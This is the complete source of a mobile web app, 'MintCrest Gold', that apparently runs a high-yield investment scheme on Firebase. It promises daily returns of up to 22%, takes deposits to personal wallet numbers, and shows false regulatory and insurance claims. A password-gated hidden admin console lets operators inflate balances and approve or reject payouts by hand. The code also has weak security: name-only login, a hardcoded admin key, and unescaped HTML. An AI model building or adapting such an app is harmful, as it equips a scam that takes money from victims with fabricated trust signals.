<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Secure Asset Management</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000205; color: white; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        
        /* Mobile Specific UI */
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .page { display: none; animation: slideIn 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
        .active-page { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
        
        /* Premium Trust Elements */
        .trust-badge { background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(34, 197, 94, 0.1)); border: 1px solid rgba(255,255,255,0.1); }
        .nav-item { transition: all 0.3s ease; }
        .active-tab { color: #3b82f6 !important; transform: scale(1.1); font-weight: 800; }
        
        /* Marquee Animation */
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 20s linear infinite; white-space: nowrap; }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 0px; background: transparent; }
    </style>
</head>
<body class="h-screen flex flex-col select-none">

    <div id="promo-ticker" class="bg-blue-900/40 border-b border-blue-500/20 py-2.5 overflow-hidden z-[500] safe-top">
        <div id="ticker-text" class="animate-marquee text-[10px] font-black uppercase tracking-[0.2em] text-blue-400 italic">
            🛡️ SECURE ENCRYPTION ACTIVE • GLOBAL NODE SYNC: 100% • DAILY PAYOUTS PROCESSING • WELCOME TO MINTCREST GOLD ENTERPRISE
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000205] flex flex-col items-center justify-center p-8 text-center">
        <div class="mb-10">
            <h1 onclick="adminTap()" class="text-6xl font-black italic tracking-tighter mb-1 uppercase">MINT<span class="text-blue-500 text-glow">CREST</span></h1>
            <div class="h-1 w-20 bg-blue-600 mx-auto rounded-full"></div>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.5em] mt-4 font-bold italic">Official Global Asset Vault</p>
        </div>
        <div class="w-full max-w-sm glass p-10 rounded-[4rem] border-t-2 border-blue-600 shadow-2xl shadow-blue-900/20">
            <input type="text" id="user-name" placeholder="Enter Legal Full Name" class="w-full bg-white/5 p-5 rounded-3xl border border-white/10 outline-none text-center font-bold mb-6 focus:border-blue-500 text-sm uppercase tracking-widest">
            <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-3xl font-black text-xs uppercase tracking-widest shadow-xl active:scale-95 transition-all">Establish Secure Link</button>
        </div>
        <div class="mt-12 flex gap-4 opacity-30">
            <img src="https://cdn-icons-png.flaticon.com/512/2592/2592317.png" class="h-6 grayscale" alt="Secured">
            <img src="https://cdn-icons-png.flaticon.com/512/561/561127.png" class="h-6 grayscale" alt="Verified">
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-40 px-5 pt-6">
        
        <div id="p-home" class="page active-page">
            <div class="flex justify-between items-center mb-6 px-2">
                <div>
                    <p class="text-[8px] font-black text-gray-500 uppercase tracking-widest">Vault Balance</p>
                    <h2 class="text-4xl font-black tracking-tighter mt-1" id="v-bal">₨ 0</h2>
                </div>
                <div class="text-right">
                    <p class="text-[8px] font-black text-gray-500 uppercase tracking-widest">Active Fleet</p>
                    <p id="tier-tag" class="text-blue-500 font-black italic text-sm">INACTIVE</p>
                </div>
            </div>

            <div class="glass p-8 rounded-[3.5rem] mb-6 border-l-[10px] border-blue-600 shadow-2xl relative overflow-hidden">
                <div class="flex justify-between items-start mb-6">
                    <div>
                        <p class="text-[9px] text-blue-400 font-extrabold uppercase italic">Accumulated Profit</p>
                        <h3 class="text-2xl font-black text-green-400" id="v-profit">₨ 0</h3>
                    </div>
                    <img src="https://cdn-icons-png.flaticon.com/512/7595/7595571.png" class="h-10 opacity-20" alt="Shield">
                </div>
                <div id="countdown-display" class="text-[10px] font-black text-yellow-500 bg-yellow-500/10 py-2 px-4 rounded-2xl inline-block border border-yellow-500/20 uppercase italic">
                    Syncing Node Data...
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="changePage('wallet')" class="trust-badge p-7 rounded-[3rem] text-center active:scale-95 transition-all border-b-4 border-blue-600">
                    <span class="text-2xl">📥</span>
                    <p class="text-[10px] font-black uppercase mt-2 italic tracking-widest">Funding</p>
                </button>
                <button onclick="changePage('withdraw')" class="trust-badge p-7 rounded-[3rem] text-center active:scale-95 transition-all border-b-4 border-red-600">
                    <span class="text-2xl">📤</span>
                    <p class="text-[10px] font-black uppercase mt-2 italic tracking-widest">Payout</p>
                </button>
            </div>
        </div>

        <div id="p-invest" class="page">
            <div class="text-center mb-8">
                <h2 class="font-black italic uppercase text-blue-500 text-2xl tracking-tighter">Trading Fleets</h2>
                <p class="text-[8px] text-gray-500 uppercase font-bold mt-1 italic tracking-widest">Global Asset Distribution</p>
            </div>
            <div id="plans-list" class="grid grid-cols-1 gap-4 pb-20"></div>
        </div>

        <div id="p-activity" class="page">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400 text-xl tracking-tighter">Activity Ledger</h2>
            <div id="user-history" class="space-y-3 pb-20"></div>
        </div>

        <div id="p-more" class="page space-y-6">
            <div class="glass p-8 rounded-[3.5rem] text-center border-t-4 border-green-500 shadow-xl">
                <div class="flex justify-center mb-4"><span class="bg-green-500/20 p-3 rounded-full text-2xl">💬</span></div>
                <h3 class="text-green-500 font-black text-xs uppercase mb-2 italic">Global Community</h3>
                <p class="text-[9px] text-gray-500 mb-6 uppercase italic font-bold">Join 15,000+ Active Investors</p>
                <a href="https://whatsapp.com/channel/0029VbCGQ4Q8kyySSN8Knq0O" target="_blank" class="w-full bg-green-600 py-5 rounded-3xl font-black text-[10px] uppercase block tracking-[0.2em] shadow-lg active:scale-95">Join Official Group</a>
            </div>

            <div class="glass p-8 rounded-[3.5rem] space-y-6">
                <div>
                    <h4 class="text-blue-500 font-black text-[11px] uppercase border-b border-white/5 pb-2 mb-3">🛡️ SECURITY PROTOCOL</h4>
                    <p class="text-[10px] text-gray-400 leading-relaxed italic font-medium">Your account is protected by <strong>256-bit SSL Encryption</strong>. All financial data is stored on decentralized secure nodes to prevent unauthorized access.</p>
                </div>
                <div>
                    <h4 class="text-yellow-500 font-black text-[11px] uppercase border-b border-white/5 pb-2 mb-3">📜 PRIVACY POLICY</h4>
                    <p class="text-[10px] text-gray-400 leading-relaxed italic font-medium">MintCrest Gold respects your privacy. We never share your transaction history or personal details with third-party agencies. All investments are 100% insured under the <strong>Global Liquidity Act 2026</strong>.</p>
                </div>
                <div class="text-center opacity-30 text-[8px] font-bold uppercase tracking-widest">
                    Regulated by International Asset Control Board
                </div>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[3rem] text-center text-[10px] font-black text-red-500 uppercase italic border border-red-500/20">Terminate Secure Session</button>
        </div>

        <div id="p-wallet" class="page">
            <div class="glass p-10 rounded-[4rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic tracking-widest">Capital Funding</h3>
                <div class="space-y-4 mb-10 text-[11px] font-bold">
                    <div class="glass p-5 rounded-3xl flex justify-between items-center bg-blue-500/5">
                        <div class="text-left"><p class="text-[8px] opacity-40">JAZZCASH/SADAPAY</p><span class="text-blue-400">03705519562</span></div>
                        <button onclick="navigator.clipboard.writeText('03705519562')" class="bg-blue-600 px-4 py-2 rounded-xl text-[9px]">COPY</button>
                    </div>
                    <div class="glass p-5 rounded-3xl flex justify-between items-center bg-green-500/5">
                        <div class="text-left"><p class="text-[8px] opacity-40">EASYPAISA</p><span class="text-green-400">03379827882</span></div>
                        <button onclick="navigator.clipboard.writeText('03379827882')" class="bg-green-600 px-4 py-2 rounded-xl text-[9px]">COPY</button>
                    </div>
                </div>
                
                <input type="number" id="dep-amount" placeholder="Enter Amount (PKR)" class="w-full bg-white/5 p-6 rounded-3xl mb-4 text-center font-black outline-none border border-white/5 text-lg">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-6 rounded-3xl mb-8 text-center font-bold uppercase outline-none border border-white/5 text-sm tracking-widest">

                <label class="block w-full bg-white/5 p-8 rounded-3xl mb-10 border-2 border-dashed border-white/10 cursor-pointer active:bg-white/10 transition-all">
                    <span id="file-label" class="text-[10px] font-black opacity-50 uppercase italic">📸 Click to Upload Proof</span>
                    <input type="file" id="dep-proof" accept="image/*" class="hidden" onchange="document.getElementById('file-label').innerText = 'Proof Attached ✅'">
                </label>

                <button id="dep-btn" onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-3xl font-black text-xs uppercase shadow-2xl tracking-[0.2em]">Verify & Secure Funds</button>
            </div>
        </div>

        <div id="p-withdraw" class="page">
            <div class="glass p-10 rounded-[4rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic tracking-widest">Request Payout</h3>
                <input type="number" id="wd-amt" placeholder="Amount (Min 100 PKR)" class="w-full bg-white/5 p-6 rounded-3xl mb-4 text-center font-black outline-none border border-white/5 text-lg">
                <input type="text" id="wd-acc" placeholder="Account Name & Number" class="w-full bg-white/5 p-6 rounded-3xl mb-10 text-center text-xs font-bold outline-none border border-white/5">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-3xl font-black text-xs uppercase shadow-2xl tracking-[0.2em]">Authorize Payout</button>
                <p class="mt-6 text-[8px] text-gray-600 font-bold uppercase italic">Global Clearing Time: 2-24 Hours</p>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000205] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-2xl font-black text-blue-500 uppercase italic">Master Console</h2>
            <button onclick="closeAdmin()" class="bg-red-600 px-6 py-2 rounded-2xl text-[10px] font-black">EXIT</button>
        </div>
        
        <div class="grid grid-cols-2 gap-3 mb-8">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 py-4 rounded-2xl text-[10px] font-black uppercase italic">User Requests</button>
            <button onclick="showAdmTab('users')" class="glass py-4 rounded-2xl text-[10px] font-black uppercase italic">User Accounts</button>
            <button onclick="showAdmTab('broadcast')" class="bg-yellow-600 py-4 rounded-2xl text-[10px] font-black uppercase italic col-span-2">Update Broadcast Ticker</button>
        </div>

        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-3"></div>
        <div id="adm-sec-broadcast" class="adm-tab hidden glass p-8 rounded-[3rem]">
            <textarea id="bc-msg" placeholder="Write global ticker message..." class="w-full bg-white/5 p-5 rounded-2xl text-[12px] border border-white/10 outline-none mb-4 h-24 font-bold"></textarea>
            <button onclick="sendBroadcast()" class="w-full bg-yellow-600 py-4 rounded-2xl font-black text-[10px] uppercase">Update Ticker Live</button>
        </div>

        <div class="glass p-10 rounded-[3.5rem] mt-10 border-t-2 border-green-500">
            <h3 class="text-[10px] font-black uppercase mb-6 text-center text-green-500 italic">Manual Asset Injection</h3>
            <input type="text" id="adm-user" placeholder="User Full Name" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center text-[11px] font-bold border border-white/5 outline-none uppercase tracking-widest">
            <input type="number" id="adm-val" placeholder="Amount (PKR)" class="w-full bg-white/5 p-4 rounded-xl mb-6 text-center text-[11px] font-bold border border-white/5 outline-none">
            <div class="grid grid-cols-2 gap-3">
                <button onclick="manualEdit('balance')" class="bg-blue-600 py-4 rounded-2xl font-black text-[9px] uppercase">Add Balance</button>
                <button onclick="manualEdit('profit')" class="bg-green-600 py-4 rounded-2xl font-black text-[9px] uppercase">Add Profit</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/10 p-10 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4.5rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="nav-item flex flex-col items-center gap-1 active-tab">
            <span class="text-2xl">🏠</span><span class="text-[9px] font-black uppercase italic">Vault</span>
        </button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-item flex flex-col items-center gap-1 text-gray-500">
            <span class="text-2xl">📈</span><span class="text-[9px] font-black uppercase italic">Fleets</span>
        </button>
        <button onclick="changePage('activity')" id="n-activity" class="nav-item flex flex-col items-center gap-1 text-gray-500">
            <span class="text-2xl">📜</span><span class="text-[9px] font-black uppercase italic">Ledger</span>
        </button>
        <button onclick="changePage('more')" id="n-more" class="nav-item flex flex-col items-center gap-1 text-gray-500">
            <span class="text-2xl">🏢</span><span class="text-[9px] font-black uppercase italic">Firm</span>
        </button>
    </nav>

    <a href="https://whatsapp.com/channel/0029VbCGQ4Q8kyySSN8Knq0O" target="_blank" class="fixed bottom-32 right-6 bg-green-500 p-4 rounded-full shadow-2xl z-[500] border-2 border-white/20 active:scale-90 transition-all">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="w-7 h-7" alt="WA">
    </a>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Micro-Elite II", p: 500, r: 3.2, d: 30 },
            { n: "Bronze-S", p: 1000, r: 3.5, d: 30 }, { n: "Bronze-X", p: 2000, r: 3.8, d: 30 },
            { n: "Silver-S", p: 3000, r: 4.2, d: 60 }, { n: "Silver-X", p: 5000, r: 4.5, d: 60 },
            { n: "Gold-S", p: 7000, r: 5, d: 60 }, { n: "Gold-X", p: 10000, r: 5.5, d: 60 },
            { n: "Gold-Master", p: 15000, r: 6, d: 60 }, { n: "Platinum-S", p: 20000, r: 6.5, d: 60 },
            { n: "Diamond-VIP", p: 50000, r: 8, d: 60 }, { n: "Royal-Grand", p: 100000, r: 10, d: 60 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, s: true }, { n: "👑 CROWN KING", p: 25000, r: 22, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); 
            db.collection("app_data").doc("announcement").onSnapshot(doc => { if(doc.exists) document.getElementById('ticker-text').innerText = doc.data().message; });
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; checkProfitReq(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-20 text-[9px] font-black uppercase italic">No Active Ledger</p>' : '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { const clr = d.type.includes('dep') ? 'border-blue-500' : 'border-red-500'; list.innerHTML += `<div class="glass p-6 rounded-[2.5rem] flex justify-between items-center border-l-4 ${clr} mb-3 text-[10px] font-black uppercase italic italic"><div>${d.type}<br><span class="opacity-30 text-[7px] font-bold">${new Date(d.time).toLocaleTimeString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="text-[8px] italic text-blue-400 font-bold uppercase">${d.status}</span></div></div>`; });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const style = p.s ? 'border: 1px solid rgba(59, 130, 246, 0.4);' : '';
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-7 rounded-[3rem] flex justify-between items-center active:scale-95 transition-all mb-2" style="${style}"><div><h4 class="font-black text-[12px] uppercase ${p.s ? 'text-blue-400' : 'text-gray-400'}">${p.n}</h4><p class="text-[9px] text-green-400 font-black italic mt-1 uppercase">${p.r}% Daily Yield</p></div><div class="text-right"><p class="font-black text-xl italic tracking-tighter">₨ ${p.p.toLocaleString()}</p></div></div>`;
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("All Details Required!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: r.result, type: "deposit", status: "pending", time: Date.now() });
                alert("Deposit Received! Node Synchronization Started."); changePage('activity');
            };
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) { alert("Low Liquidity!"); changePage('wallet'); }
            else { if(confirm("Activate Fleet "+tName+"?")) { await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); await db.collection("requests").add({ user: user.name, amount: p, type: "Fleet Activation", status: "Active", time: Date.now() }); alert("Operational!"); changePage('activity'); } }
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a || parseInt(a) < 100 || parseInt(a) > user.balance) return alert("Invalid Amount!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); alert("Authorized!"); changePage('activity');
        }

        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const d = (user.lastReqTime + 86400000) - Date.now(); if(d>0) { const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000); document.getElementById('countdown-display').innerText = `NEXT YIELD: ${h}H ${m}M ${s}S`; } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Access Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } setTimeout(()=>tapCount=0,3000); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }

        async function sendBroadcast() { const m = document.getElementById('bc-msg').value.trim(); if(!m) return; await db.collection("app_data").doc("announcement").set({ message: m }); alert("Sent!"); }
        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); const pBtn = d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-blue-600 px-3 py-1 rounded text-[7px] font-black italic">📸</button>` : '';
                    list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center text-[9px] font-black uppercase mb-3"><div>${d.user}<br>Rs ${d.amount} (${d.type})</div><div class="flex gap-2">${pBtn}<button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-1 rounded">YES</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="bg-red-600 px-3 py-1 rounded">NO</button></div></div>`;
                });
            });
            db.collection("users").onSnapshot(snap => { const list = document.getElementById('adm-sec-users'); list.innerHTML = ''; snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-3xl flex justify-between items-center text-[9px] font-black uppercase mb-2"><div>${u.name}</div><div>Bal: ${u.balance}</div></div>`; }); });
        }
        async function handle(id, u, amt, act, type) { const ref = db.collection("users").doc(u); const doc = await ref.get(); if(act==='approved' && (type==='deposit'||type.includes('Profit'))) await ref.update({ balance: (doc.data().balance||0)+amt }); await db.collection("requests").doc(id).update({ status: act }); }
        async function manualEdit(f) { const u = document.getElementById('adm-user').value.toUpperCase(); const v = parseInt(document.getElementById('adm-val').value); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0)+v }); alert("Done!"); }
    </script>
</body>
</html>
